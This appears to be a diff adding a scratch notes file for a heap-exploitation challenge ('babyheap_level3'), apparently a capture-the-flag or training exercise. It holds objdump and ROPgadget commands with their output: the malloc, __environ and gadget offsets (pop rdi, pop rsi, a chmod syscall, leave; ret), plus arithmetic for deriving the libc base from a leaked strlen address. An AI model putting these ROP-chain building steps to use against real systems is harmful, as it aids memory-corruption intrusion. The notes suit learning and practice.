@@ -1,0 +1,25 @@
+
+objdump -d babyheap_level3 | grep 'malloc'
+
+# 404080 <malloc@GLIBC_2.2.5>
+
+objdump -T libc.so.6 | grep environ
+00000000003ee098 g    DO .bss	0000000000000008  GLIBC_2.2.5 __environ
+
+ROPgadget --binary libc.so.6 | grep 'pop rdi'
+0x000000000002155f : pop rdi ; ret
+
+ROPgadget --binary libc.so.6 | grep 'pop rsi'
+0x0000000000023e8a : pop rsi ; ret
+
+ROPgadget --binary libc.so.6 | grep 'mov eax, 0x5a ; syscall'
+0x000000000010fbd0 : mov eax, 0x5a ; syscall
+
+ROPgadget --binary libc.so.6 | grep 'leave ; ret'
+0x0000000000034d33 : leave ; ret
+
+0xb1690 = vmmap libc_base - arbitarty read base
+4210728 = 0x404028
+
+0xb1690 = 0x7f7bf0b53690 - 0x7f7bf0aa2000 (strlen glibc - libc base from gdb)
+=> libc base = value at strlen glibc address - 0xb1690
